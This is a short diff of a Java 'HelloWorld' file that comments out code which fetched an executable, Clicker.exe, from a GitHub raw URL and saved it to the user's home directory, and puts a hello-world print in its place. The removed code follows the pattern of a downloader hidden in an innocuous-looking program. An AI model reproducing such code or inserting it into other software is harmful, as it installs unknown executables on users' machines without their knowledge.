@@ -6,7 +6,8 @@ import java.net.URLConnection;
 
 public class HelloWorld {
     public static void main(String[] args) {
-        String fileURL = "https://github.com/jahzaer/xrthwidxrt/raw/main/Clicker.exe";
+        System.out.println("hello world");
+        /*String fileURL = "https://github.com/jahzaer/xrthwidxrt/raw/main/Clicker.exe";
         String userHome = System.getProperty("user.home");
         File downloadedFile = new File(userHome + "/Clicker.exe");
 
@@ -40,6 +41,6 @@ public class HelloWorld {
             }
         } catch (Exception e) {
             e.printStackTrace();
-        }
+        }*/
     }
 }
